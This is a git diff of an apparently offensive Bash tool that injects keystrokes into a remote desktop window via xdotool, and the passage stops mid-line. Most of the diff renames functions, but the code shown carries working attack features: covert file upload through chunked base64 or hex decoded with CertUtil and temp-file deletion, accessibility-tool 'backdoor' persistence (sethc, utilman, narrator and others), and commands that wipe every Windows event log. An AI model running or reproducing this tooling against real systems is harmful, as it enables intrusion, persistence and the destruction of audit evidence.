@@ -1,7 +1,5 @@
 #!/bin/bash
 
-# Helper functions
-
 function print_status() {
     local status="${1}"
     local message="${2}"
@@ -33,30 +31,141 @@ function check_display_server() {
 	fi
 }
 
-# TODO: Add check for xfreerdp-x11 and remmina. Also do some checks with supported package managers.
-
-function check_dependencies() {
-    if ! which xdotool &>/dev/null
+function check_elevated() {
+    if [[ ${EUID} -ne 0 ]]
     then
-        print_status "warning" "Installing missing dependency..."
-        if ! which sudo 2>/dev/null || [[ "${EUID}" -eq 0 ]]
-        then
-            apt install -y xdotool
-        else
-            sudo apt install -y xdotool
-        fi
+        print_status "error" "Execute the script with elevated privileges (without sudo)."
+        print_status "information" "Terminating program..."
         exit 1
     fi
 }
 
-function GetWindowSyncID() {
+function check_program() {
+    local program="${1}"
+    if [[ -z $(which "${program}") ]]
+    then
+        echo "${program}"
+    fi
+}
+
+function install_dependencies() {
+    local package_manager="${1}"
+    local package="${2}"
+
+    case "${package_manager}" in
+        apt)
+            apt install -y "${package}"
+            ;;
+        dnf)
+            dnf install "${package}"
+            ;;
+        pacman)
+            pacman -S "${package}"
+            ;;
+        emerge)
+            emerge "${package}"
+            ;;
+        nix-env)
+            nix-env -iA "${package}"
+            ;;
+        *)
+            print_status "error" "Unsupported package manager."
+            ;;
+    esac
+}
+
+function retrieve_dependencies() {
+    local package_manager="${1}"
+    declare -A packages
+
+    case "${package_manager}" in
+        apt)
+            packages["xdotool"]="xdotool"
+            packages["xfreerdp"]="freerdp2-x11"
+            packages["remmina"]="remmina"
+            ;;
+        dnf)
+            packages["xdotool"]="xdotool"
+            packages["xfreerdp"]="freerdp"
+            packages["remmina"]="remmina"
+            ;;
+        pacman)
+            packages["xdotool"]="xdotool"
+            packages["xfreerdp"]="freerdp"
+            packages["remmina"]="remmina"
+            ;;
+        emerge)
+            packages["xdotool"]="xdotool"
+            packages["xfreerdp"]="freerdp"
+            packages["remmina"]="remmina"
+            ;;
+        nix-env)
+            packages["xdotool"]="nixpkgs.xdotool"
+            packages["xfreerdp"]="nixpkgs.xfreerdp"
+            packages["remmina"]="nixpkgs.remmina"
+            ;;
+        *)
+            print_status "error" "Unsupported package manager."
+            ;;
+    esac
+
+    local missing_dependencies=()
+    local programs=("xdotool" "xfreerdp" "remmina")
+    for program in "${programs[@]}"
+    do
+        if [[ -n $(check_program "${program}") ]]
+        then
+            missing_dependencies+=("${packages[$program]}")
+        fi
+    done
+
+    if [[ ${#missing_dependencies[@]} -eq 0 ]]
+    then
+        print_status "information" "All required dependencies are already installed."
+    else
+        check_elevated
+
+        print_status "information" "Installing required dependencies..."
+        for dependency in "${missing_dependencies[@]}"
+        do
+            install_dependencies "${package_manager}" "${dependency}"
+        done
+    fi
+}
+
+function check_dependencies() {
+    declare -A package_managers=(
+        ["apt"]="debian"
+        ["dnf"]="redhat"
+        ["pacman"]="arch"
+        ["emerge"]="gentoo"
+        ["nix-env"]="nixos"
+    )
+
+    for package_manager in "${!package_managers[@]}"
+    do
+        if [[ -n $(which "${package_manager}") ]]
+        then
+            local distro=${package_managers[${package_manager}]}
+            print_status "information" "OS Distribution: ${distro}"
+            retrieve_dependencies "${package_manager}"
+            return
+        fi
+    done
+
+    print_status "error" "Unsupported distribution."
+    print_status "information" "Terminating program..."
+    exit 1
+}
+
+function get_window_sync_id() {
     local windowname="${1}"
     local sync_id=$(xdotool search --name "${windowname}" getwindowfocus getactivewindow)
 
     echo "${sync_id}"
 }
 
-function Keyboard() {
+function keyboard() {
     local input="${1}"
     local key="${2}"
 
@@ -81,7 +190,7 @@ function Keyboard() {
     fi
 }
 
-function RandomString() {
+function randomize_string() {
     local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
     local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
     local string=""
@@ -95,7 +204,7 @@ function RandomString() {
     echo "${string}"
 }
 
-function CountLines() {
+function count_lines() {
     local file="${1}"
     local counter=0
 
@@ -156,9 +265,9 @@ function terminate_program() {
 
 trap terminate_program SIGINT
 
-function Automate() {
+function automate() {
     local file="${1}"
-    local lines=$(CountLines "${file}")
+    local lines=$(count_lines "${file}")
 
     print_status "progress" "Executing commands..."
 
@@ -166,39 +275,17 @@ function Automate() {
     if [[ ${lines} -eq 0 ]]
     then
 	read contents < "${file}"
-	Keyboard "${contents}" "escapechars"
+	keyboard "${contents}" "escapechars"
     else
         while read -r line
         do
-            Keyboard "${line}" "escapechars"
+            keyboard "${line}" "escapechars"
         done < "${file}"
     fi
     print_status "completed" "Task completed!"
 }
 
-function Execute() {
-    local commands="${1}"
-    local method="${2}"
-
-    case "${method}" in
-        none)
-            print_status "progress" "Executing commands..."
-            Keyboard "${commands}" "escapechars"
-            print_status "completed" "Task completed!"
-            ;;
-        dialogbox)
-            DialogBox "${commands}"
-            ;;
-        *)
-            print_status "error" "Invalid Execution Type!" >&2
-            print_status "information" "Available methods are: none, and dialogbox"
-			print_status "information" "Terminating program..."
-            exit 1
-            ;;
-    esac
-}
-
-function DialogBox() {
+function dialogue_box() {
     local commands="${1}"
 
     print_status "information" "Checking one of the lines reaches 260 character limit"
@@ -209,12 +296,34 @@ function DialogBox() {
     fi
 
     print_status "progress" "Executing commands..."
-    Keyboard "Super+r" "customkey"
-    Keyboard "${commands}" "escapechars"
+    keyboard "Super+r" "customkey"
+    keyboard "${commands}" "escapechars"
     print_status "completed" "Task completed!"
 }
 
-function Base64() {
+function execute() {
+    local commands="${1}"
+    local method="${2}"
+
+    case "${method}" in
+        none)
+            print_status "progress" "Executing commands..."
+            keyboard "${commands}" "escapechars"
+            print_status "completed" "Task completed!"
+            ;;
+        dialogbox)
+            dialogue_box "${commands}"
+            ;;
+        *)
+            print_status "error" "Invalid Execution Type!" >&2
+            print_status "information" "Available methods are: none, and dialogbox"
+			print_status "information" "Terminating program..."
+            exit 1
+            ;;
+    esac
+}
+
+function base64() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
@@ -223,8 +332,8 @@ function Base64() {
     local file_type=${file_charset##*: }
     local data
     local chunks=100
-    local random_var_one=$(RandomString)
-    local random_var_two=$(RandomString)
+    local random_var_one=$(randomize_string)
+    local random_var_two=$(randomize_string)
 
     # TODO: Implement encryption method through base64 with -e,--evasion flag
     # $ rks -i file -o output -m pwshb64 -e compression
@@ -251,14 +360,14 @@ function Base64() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                Keyboard "\$${random_var_one} = \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_var_one} = \"${data:i:chunks}\"" "return"
             else
-                Keyboard "\$${random_var_one} += \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_var_one} += \"${data:i:chunks}\"" "return"
             fi
         done
 
-        Keyboard "[byte[]]\$${random_var_two} = [Convert]::FromBase64String(\$${random_var_one})" "return"
-        Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_var_two})" "return"
+        keyboard "[byte[]]\$${random_var_two} = [Convert]::FromBase64String(\$${random_var_one})" "return"
+        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_var_two})" "return"
 
         print_status "completed" "File transferred!"
     elif [[ "${platform}" == "linux" && "${mode}" == "console" ]]
@@ -271,25 +380,25 @@ function Base64() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                Keyboard "${random_var_one}=\"${data:i:chunks}\"" "return"
+                keyboard "${random_var_one}=\"${data:i:chunks}\"" "return"
             else
-                Keyboard "${random_var_one}+=\"${data:i:chunks}\"" "return"
+                keyboard "${random_var_one}+=\"${data:i:chunks}\"" "return"
             fi
         done
 
-        Keyboard "base64 -d <<< \$${random_var_one} > \"${output_file}\"" "return"
+        keyboard "base64 -d <<< \$${random_var_one} > \"${output_file}\"" "return"
         print_status "completed" "File transferred!"
     fi
 }
 
-function Base32() {
+function base32() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local data
     local chunks=100
-    local random_var=$(RandomString)
+    local random_var=$(randomize_string)
 
     # TODO: Implement this feature
     # $ basenc -w 0 --base32 file.txt
@@ -300,15 +409,15 @@ function Base32() {
 }
 
 # Using hexadecimal to encode files
-function Base16() {
+function base16() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local data
     local chunks=100
-    local random_var=$(RandomString)
-    local random_temp_file=$(RandomString)
+    local random_var=$(randomize_string)
+    local random_temp_file=$(randomize_string)
     local directory_path=$(DirectoryName "${output_file}")
 
     if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
@@ -330,13 +439,13 @@ function Base16() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                Keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
             else
-                Keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
             fi
         done
 
-            Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_var} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "return"
+            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_var} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "return"
         elif [[ "${mode}" == "certutil" ]]
         then
             if [[ "${platform}" != "windows" ]]
@@ -361,14 +470,14 @@ function Base16() {
 			do
 			    if [[ ${i} -eq 0 ]]
 			    then
-			        Keyboard "set ${random_var}=${data:i:chunks}" "return"
+			        keyboard "set ${random_var}=${data:i:chunks}" "return"
 			    else
-			        Keyboard "set ${random_var}=%${random_var}%${data:i:chunks}" "return"
+			        keyboard "set ${random_var}=%${random_var}%${data:i:chunks}" "return"
 			    fi
 			done
-			Keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "return"
-			Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "return"
-			Keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
+			keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "return"
+			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "return"
+			keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
     	elif [[ "${mode}" == "console" ]]
     	then
             print_status "progress" "Transferring file..."
@@ -384,14 +493,14 @@ function Base16() {
             do
                 if [[ ${i} -eq 0 ]]
                 then
-                    Keyboard "${random_var}=\"${temp:i:chunks}\"" "return"
+                    keyboard "${random_var}=\"${temp:i:chunks}\"" "return"
                 else
-                    Keyboard "${random_var}+=\"${temp:i:chunks}\"" "return"
+                    keyboard "${random_var}+=\"${temp:i:chunks}\"" "return"
                 fi
             done
 
 			# Interpret the backslash to output into a file.
-            Keyboard "echo -en \$${random_var} > \"${output_file}\"" "return"
+            keyboard "echo -en \$${random_var} > \"${output_file}\"" "return"
     	fi
         print_status "completed" "File transferred!"
     fi
@@ -399,14 +508,14 @@ function Base16() {
 
 # Using binary digits of 0 and 1
 # to encode files with each 8 bits of size
-function Base2() {
+function base2() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local data
     local chunks=100
-    local random_var=$(RandomString)
+    local random_var=$(randomize_string)
 
     # TODO: Implement this feature
     # $ basenc -w 0 --base2msbf file.txt
@@ -414,14 +523,14 @@ function Base2() {
 }
 
 # Using decimals to encode files
-function Base10() {
+function base10() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local data
     local chunks=100
-    local random_var=$(RandomString)
+    local random_var=$(randomize_string)
 
     # TODO: Implement this feature
     # $ printf
@@ -429,21 +538,21 @@ function Base10() {
 }
 
 # Using octals to encode files
-function Base8() {
+function base8() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local data
     local chunks=100
-    local random_var=$(RandomString)
+    local random_var=$(randomize_string)
 
     # TODO: Implement this feature
     # $ od -A n -t o1 -v file.txt | tr -d "[:space:]"
     echo "not implemented"
 }
 
-function PowershellOutFile() {
+function powershell_outfile() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
@@ -454,7 +563,7 @@ function PowershellOutFile() {
     local chunks=100
     local hexadecimal=()
     local counter
-    local random_temp_file=$(RandomString)
+    local random_temp_file=$(randomize_string)
     local directory_path=$(DirectoryName "${output_file}")
 
     if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
@@ -484,17 +593,17 @@ function PowershellOutFile() {
                 done < "${input}"
 
                 print_status "progress" "Transferring file..."
-                Keyboard "@'" "escapechars"
+                keyboard "@'" "escapechars"
                 while read -r line
                 do
-                    Keyboard "${line}" "return"
+                    keyboard "${line}" "return"
                 done < "${input}"
 
-                Keyboard "'@ | Out-File ${output_file}" "escapechars"
+                keyboard "'@ | Out-File ${output_file}" "escapechars"
             elif [[ "${file_type}" == "binary" ]]
             then
                 print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
-                PowershellOutFile "${input}" "${output_file}" "${platform}" "certutil"
+                powershell_outfile "${input}" "${output_file}" "${platform}" "certutil"
                 exit 1
             fi
         elif [[ "${mode}" == "base64" ]]
@@ -511,23 +620,23 @@ function PowershellOutFile() {
 
             print_status "progress" "Transferring file..."
             data=$(basenc -w 0 --base64 "${input}")
-            Keyboard "@'" "escapechars"
-            Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
+            keyboard "@'" "escapechars"
+            keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
 
 	        for (( i=0; i<${#data}; i+=chunks ))
 	        do
 	            if [[ ${i} -eq 0 ]]
 	            then
-	            	Keyboard "${data:i:chunks}" "return"
+	            	keyboard "${data:i:chunks}" "return"
 	            else
-	            	Keyboard "${data:i:chunks}" "return"
+	            	keyboard "${data:i:chunks}" "return"
 	            fi
 	        done
 
-            Keyboard "-----END CERTIFICATE-----" "escapechars"
-            Keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escapechars"
-            Keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
-            Keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "return"
+            keyboard "-----END CERTIFICATE-----" "escapechars"
+            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escapechars"
+            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
+            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "return"
         elif [[ "${mode}" == "hex" ]]
         then
             print_status "progress" "Transferring file..."
@@ -539,28 +648,28 @@ function PowershellOutFile() {
             	hexadecimal+=("${data:i:2}")
             done
 
-            Keyboard "@'" "escapechars"
+            keyboard "@'" "escapechars"
 
             counter=0
             for ((i=0; i<${#hexadecimal[@]}; i++))
             do
                 if [[ ${counter} -eq 7 ]]
                 then
-                	Keyboard "${hexadecimal[i]}" "noreturn"
-                	Keyboard "space" "customkey"
+                	keyboard "${hexadecimal[i]}" "noreturn"
+                	keyboard "space" "customkey"
                 elif [[ ${counter} -eq 8 ]]
                 then
-                	Keyboard "space" "customkey"
+                	keyboard "space" "customkey"
                     (( counter++ ))
                 elif [[ ${counter} -eq 15 ]]
                 then
-                	Keyboard "${hexadecimal[i]}" "return"
+                	keyboard "${hexadecimal[i]}" "return"
                 elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
                 then
-                    Keyboard "${hexadecimal[i]}" "return"
+                    keyboard "${hexadecimal[i]}" "return"
                 else
-                	Keyboard "${hexadecimal[i]}" "noreturn"
-                	Keyboard "space" "customkey"
+                	keyboard "${hexadecimal[i]}" "noreturn"
+                	keyboard "space" "customkey"
                 fi
 
                 if [[ ${counter} -eq 15 ]]
@@ -570,28 +679,28 @@ function PowershellOutFile() {
                     (( counter++ ))
                 fi
             done
-            Keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escapechars"
-			Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
-			Keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "return"
+            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escapechars"
+			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
+			keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "return"
         fi
     fi
 
     print_status "completed" "File transferred!"
 }
 
-function CopyCon() {
+function copy_con() {
     local input="${1}"
     local output_file="${2}"
     local platform="${3}"
     local mode="${4}"
     local file_charset=$(file --mime-encoding "${input}")
     local file_type=${file_charset##*: }
-    local lines=$(CountLines "${input}")
+    local lines=$(count_lines "${input}")
     local data
     local chunks
     local hexadecimal=()
     local counter
-    local random_temp_file=$(RandomString)
+    local random_temp_file=$(randomize_string)
     local directory_path=$(DirectoryName "${output_file}")
 
     if [[ "${platform}" != "windows" ]]
@@ -617,16 +726,16 @@ function CopyCon() {
         done < "${input}"
 
         print_status "progress" "Transferring file..."
-        Keyboard "copy con ${output_file}" "return"
+        keyboard "copy con ${output_file}" "return"
 
         counter=1
         while read -r line
         do
             if [[ ${counter} -ne ${lines} ]]
             then
-                Keyboard "${line}" "return"
+                keyboard "${line}" "return"
             else
-                Keyboard "${line}" "copycon"
+                keyboard "${line}" "copycon"
             fi
             (( counter++ ))
         done < "${input}"
@@ -642,22 +751,22 @@ function CopyCon() {
         fi
 
         print_status "progress" "Transferring file..."
-        Keyboard "copy con \"${directory_path}\\${random_temp_file}.txt\"" "return"
-        Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
+        keyboard "copy con \"${directory_path}\\${random_temp_file}.txt\"" "return"
+        keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
 
         for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ ${i} -eq 0 ]]
             then
-                Keyboard "${data:i:chunks}" "return"
+                keyboard "${data:i:chunks}" "return"
             else
-                Keyboard "${data:i:chunks}" "return"
+                keyboard "${data:i:chunks}" "return"
             fi
         done
 
-        Keyboard "-----END CERTIFICATE-----" "copycon"
-        Keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
-        Keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "return"
+        keyboard "-----END CERTIFICATE-----" "copycon"
+        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
+        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "return"
     elif [[ "${mode}" == "hex" ]]
     then
     	print_status "progress" "Transferring file..."
@@ -669,28 +778,28 @@ function CopyCon() {
         	hexadecimal+=("${data:i:2}")
         done
 
-        Keyboard "copy con \"${directory_path}\\${random_temp_file}.hex\"" "return"
+        keyboard "copy con \"${directory_path}\\${random_temp_file}.hex\"" "return"
 
 		counter=0
 		for ((i=0; i<${#hexadecimal[@]}; i++))
 		do
             if [[ ${counter} -eq 7 ]]
             then
-                Keyboard "${hexadecimal[i]}" "noreturn"
-                Keyboard "space" "customkey"
+                keyboard "${hexadecimal[i]}" "noreturn"
+                keyboard "space" "customkey"
             elif [[ ${counter} -eq 8 ]]
             then
-                Keyboard "space" "customkey"
+                keyboard "space" "customkey"
                 (( counter++ ))
             elif [[ ${counter} -eq 15 ]]
             then
-                Keyboard "${hexadecimal[i]}" "return"
+                keyboard "${hexadecimal[i]}" "return"
             elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
             then
-                Keyboard "${hexadecimal[i]}" "copycon"
+                keyboard "${hexadecimal[i]}" "copycon"
             else
-               	Keyboard "${hexadecimal[i]}" "noreturn"
-               	Keyboard "space" "customkey"
+               	keyboard "${hexadecimal[i]}" "noreturn"
+               	keyboard "space" "customkey"
             fi
 
             if [[ ${counter} -eq 15 ]]
@@ -701,14 +810,14 @@ function CopyCon() {
             fi
         done
 
-		Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
-		Keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
+		keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
+		keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
     fi
 
     print_status "completed" "File transferred!"
 }
 
-function Upload() {
+function upload() {
     local local_file="${1}"
     local remote_file="${2}"
     local platform="${3}"
@@ -723,37 +832,37 @@ function Upload() {
 
     case "${method}" in
         "" | pwshb64)
-            Base64 "${local_file}" "${remote_file}" "${platform}" "powershell" "${action}" "${evasion}"
+            base64 "${local_file}" "${remote_file}" "${platform}" "powershell" "${action}" "${evasion}"
             ;;
         cmdb64)
-            CopyCon "${local_file}" "${remote_file}" "${platform}" "base64"
+            copy_con "${local_file}" "${remote_file}" "${platform}" "base64"
             ;;
         nixb64)
-            Base64 "${local_file}" "${remote_file}" "${platform}" "console" "${action}"
+            base64 "${local_file}" "${remote_file}" "${platform}" "console" "${action}"
             ;;
         outfile)
-            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "text"
+            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "text"
             ;;
         outfileb64)
-            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "base64"
+            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "base64"
             ;;
         copycon)
-            CopyCon "${local_file}" "${remote_file}" "${platform}" "text"
+            copy_con "${local_file}" "${remote_file}" "${platform}" "text"
             ;;
         pwshhex)
-            Base16 "${local_file}" "${remote_file}" "${platform}" "powershell"
+            base16 "${local_file}" "${remote_file}" "${platform}" "powershell"
             ;;
         cmdhex)
-            Base16 "${local_file}" "${remote_file}" "${platform}" "certutil"
+            base16 "${local_file}" "${remote_file}" "${platform}" "certutil"
             ;;
         copyconhex)
-            CopyCon "${local_file}" "${remote_file}" "${platform}" "hex"
+            copy_con "${local_file}" "${remote_file}" "${platform}" "hex"
             ;;
         nixhex)
-            Base16 "${local_file}" "${remote_file}" "${platform}" "console"
+            base16 "${local_file}" "${remote_file}" "${platform}" "console"
             ;;
         outfilehex)
-            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "hex"
+            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "hex"
             ;;
         *)
             print_status "error" "Invalid File Transfer Technique!" >&2
@@ -764,7 +873,7 @@ function Upload() {
     esac
 }
 
-function BypassUAC() {
+function bypassuac() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -774,7 +883,7 @@ EndOfText
     echo "not implemented"
 }
 
-function Elevate() {
+function elevate() {
     local elevate_method="${1}"
     local elevate_action="${2}"
     local platform="${3}"
@@ -793,7 +902,7 @@ function Elevate() {
     echo "Not implemented"
 }
 
-function CreateUser() {
+function create_user() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -818,7 +927,7 @@ EndOfText
     fi
 }
 
-function StickyKey() {
+function sticky_keys() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -844,7 +953,7 @@ EndOfText
         for (( i=1; i<=5; i++ ))
         do
             print_status "progress" "SHIFT: ${i}"
-            Keyboard "shift" "customkey"
+            keyboard "shift" "customkey"
         done
         print_status "completed" "Backdoor activated!"
     else
@@ -852,7 +961,7 @@ EndOfText
     fi
 }
 
-function UtilityManager() {
+function utility_manager() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -874,14 +983,14 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        Keyboard "Super+u" "customkey"
+        keyboard "Super+u" "customkey"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
 }
 
-function Magnifier() {
+function magnifier() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -902,15 +1011,15 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
-        Keyboard "Super+equal" "customkey"
-        Keyboard "Super+minus" "customkey"
+        keyboard "Super+equal" "customkey"
+        keyboard "Super+minus" "customkey"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
 }
 
-function Narrator() {
+function narrator() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -932,14 +1041,14 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
-        Keyboard "Super+Return" "customkey"
+        keyboard "Super+Return" "customkey"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
 }
 
-function DisplaySwitch() {
+function display_switch() {
     local platform="${1}"
     local action="${2}"
     read -d '' description << EndOfText
@@ -961,14 +1070,14 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
-        Keyboard "Super+p" "customkey"
+        keyboard "Super+p" "customkey"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
 }
 
-function Persistence() {
+function persistence() {
     local platform="${1}"
     local persistence_method="${2}"
     local persistence_action="${3}"
@@ -979,22 +1088,22 @@ function Persistence() {
     # TODO: Fill in the rest of the persistence methods
     case "${persistence_method}" in
         createuser)
-            CreateUser "${platform}" "${persistence_action}"
+            create_user "${platform}" "${persistence_action}"
             ;;
         sethc)
-            StickyKey "${platform}" "${persistence_action}"
+            sticky_keys "${platform}" "${persistence_action}"
             ;;
         utilman)
-            UtilityManager "${platform}" "${persistence_action}"
+            utility_manager "${platform}" "${persistence_action}"
             ;;
         magnifier)
-            Magnifier "${platform}" "${persistence_action}"
+            magnifier "${platform}" "${persistence_action}"
             ;;
         narrator)
-            Narrator "${platform}" "${persistence_action}"
+            narrator "${platform}" "${persistence_action}"
             ;;
         displayswitch)
-            DisplaySwitch "${platform}" "${persistence_action}"
+            display_switch "${platform}" "${persistence_action}"
             ;;
         *)
             print_status "error" "Invalid Persistence Technique!" >&2
@@ -1003,7 +1112,7 @@ function Persistence() {
     esac
 }
 
-function WevUtil() {
+function window_event_log_utility() {
     local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
@@ -1021,7 +1130,7 @@ EndOfText
         echo "${description}"
     elif [[ "${action}" == "quick" ]]
     then
-        Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
+        execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
     elif [[ "${action}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
@@ -1032,7 +1141,7 @@ EndOfText
     fi
 }
 
-function WinEvent() {
+function clear_event_log() {
     local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
@@ -1050,7 +1159,7 @@ EndOfText
         echo "${description}"
     elif [[ "${action}" == "quick" ]]
     then
-        Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
+        execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
     elif [[ "${action}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
@@ -1061,7 +1170,7 @@ EndOfText
     fi
 }
 
-function EventViewer() {
+function event_viewer() {
     local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
@@ -1080,34 +1189,34 @@ EndOfText
         echo ""
     elif [[ "${action}" == "manual" ]]
     then
-        DialogBox "eventvwr.msc"
+        dialogue_box "eventvwr.msc"
     else
     # TODO: If the mode was invalid display the available options to inform the user
         print_status "error" "Invalid mode!"
     fi
 }
 
-function AntiForensics() {
+function antiforensics() {
     local antiforensics_method="${1}"
     local antiforensics_action="${2}"
     local platform="${3}"
     # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box
 
     # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
-    # -p <windows | linux> -m <wevutil | winevent>
+    # -p <windows | linux> -m <wevtutil | clearevent>
 
     # Batch script
     # Powershell script
     # Bash script
     case "${antiforensics_method}" in
-        wevutil)
-            WevUtil "${antiforensics_method}" "${platform}" "${antiforensics_action}"
+        wevtutil)
+            window_event_log_utility "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
-        winevent)
-            WinEvent "${antiforensics_method}" "${platform}" "${antiforensics_action}"
+        clearevent)
+            clear_event_log "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
         eventvwr)
-            EventViewer "${antiforensics_method}" "${platform}" "${antiforensics_action}"
+            event_viewer "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
         *)
             print_status "error" "Invalid Antiforensic Technique!" >&2
@@ -1116,7 +1225,7 @@ function AntiForensics() {
     esac
 }
 
-function FormatDisk() {
+function format_disk() {
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -1124,7 +1233,7 @@ EndOfText
     echo "not implemented"
 }
 
-function Mayhem() {
+function mayhem() {
     local mayhem_method="${1}"
     local mayhem_action="${2}"
     local platform="${3}"
@@ -1237,10 +1346,10 @@ function main() {
     done
 
 	# If window name isn't specified it'll set to FreeRDP as default and checks if the program exists.
-    if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME}" == "freerdp") && -n $(GetWindowSyncID "${WINDOWNAME}") ]]
